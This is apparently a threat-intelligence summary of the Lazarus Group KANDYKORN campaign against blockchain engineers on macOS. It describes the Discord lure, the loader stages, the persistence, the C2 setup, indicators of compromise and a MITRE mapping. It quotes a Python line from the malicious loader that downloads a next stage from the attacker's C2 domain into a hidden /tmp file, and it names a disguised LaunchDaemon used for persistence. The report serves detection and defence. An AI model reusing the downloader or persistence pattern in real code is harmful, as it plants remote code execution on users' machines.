# Elastic Catches DPRK Passing Out KANDYKORN

**Source:** Elastic Security Labs
**Date:** October 31, 2023
**Threat Actor:** Lazarus Group / DPRK
**Campaign:** KANDYKORN

---

## Overview

Elastic Security Labs discovered a novel intrusion targeting blockchain engineers of a crypto exchange platform with a novel macOS malware tracked as KANDYKORN. The threat actors, attributed to DPRK's Lazarus Group, used social engineering via Discord to lure victims into downloading a malicious Python application disguised as a cryptocurrency arbitrage bot.

## Technical Details

### Initial Access — Social Engineering via Discord

Lazarus Group operators posed as members of a cryptocurrency community on Discord, reaching out to blockchain engineers. They convinced targets to download a "crypto arbitrage bot" hosted on a public GitHub repository. The Python application appeared legitimate but contained hidden malicious functionality.

**Delivery chain:**
1. Discord social engineering → link to GitHub repo
2. Victim clones repo: `git clone https://github.com/[attacker-repo]/cross-platform-bridge.git`
3. Victim runs: `python3 main.py`
4. `main.py` imports `testSpeed.py` which downloads next stage from C2

### Execution — Multi-Stage Loader

**Stage 1: Watcher (`testSpeed.py`)**
The script downloads an intermediate stage from the C2 server:
```python
import urllib.request
urllib.request.urlretrieve("http://tp-globa[.]xyz/OdhLca2", "/tmp/.sysupdate")
```

**Stage 2: Loader (`.sysupdate`)**
A Python script that:
- Decrypts and loads Stage 3 into memory
- Uses `ctypes` for direct memory manipulation
- Establishes persistence via LaunchDaemons

**Stage 3: Payload (`SUGARLOADER`)**
- C++ binary loaded into memory
- Establishes initial C2 communication
- Downloads final payload (KANDYKORN)

**Stage 4: KANDYKORN RAT**
Full-featured Remote Access Trojan for macOS:
- File exfiltration and upload
- Process listing and killing
- Command execution
- Directory listing
- File transfer (upload/download)
- Screen capture
- Keylogging
- Self-destruct capability

### Persistence

macOS LaunchDaemon created:
- Path: `/Library/LaunchDaemons/com.apple.sysmond.plist`
- Binary: `/usr/local/bin/.kandykorn`
- RunAtLoad: true

### Command and Control

C2 infrastructure:
- **Primary C2:** tp-globa[.]xyz
- **Secondary C2:** 23.254.226[.]90
- **Protocol:** Custom binary protocol over TCP port 443
- **Encryption:** RC4 encryption for C2 traffic
- **Beacon interval:** 60 seconds

### Indicators of Compromise

**IP Addresses:**
- 23.254.226[.]90
- 192.119.64[.]43

**Domains:**
- tp-globa[.]xyz
- on-global[.]xyz

**File Hashes (SHA-256):**
- 3ea2ead8f3cec030906dcbffe3efd5c5d77d5d375d4a54cca320c3f2b48b6e80 (SUGARLOADER)
- 927b3564c1cf884d2a05e1d7bd24362ce8563f58304a211fa72155cb0bfc8fef (KANDYKORN)
- 2360a69e5fd7217e977123c81d3dbb60bf4763a9dae6949bc1900234f7762df1 (testSpeed.py)

**File Paths:**
- /tmp/.sysupdate
- /usr/local/bin/.kandykorn
- /Library/LaunchDaemons/com.apple.sysmond.plist

**Tools:**
- Python-based loader chain
- SUGARLOADER (C++ memory loader)
- KANDYKORN RAT (macOS)

### MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| T1566.003 | Phishing: Spearphishing via Service | Initial Access |
| T1204.002 | User Execution: Malicious File | Execution |
| T1059.006 | Command and Scripting Interpreter: Python | Execution |
| T1105 | Ingress Tool Transfer | Command and Control |
| T1547.011 | Boot or Logon Autostart Execution: Plist Modification | Persistence |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | Command and Control |
| T1041 | Exfiltration Over C2 Channel | Exfiltration |
| T1082 | System Information Discovery | Discovery |
| T1083 | File and Directory Discovery | Discovery |
| T1057 | Process Discovery | Discovery |
| T1113 | Screen Capture | Collection |
| T1056.001 | Input Capture: Keylogging | Collection |
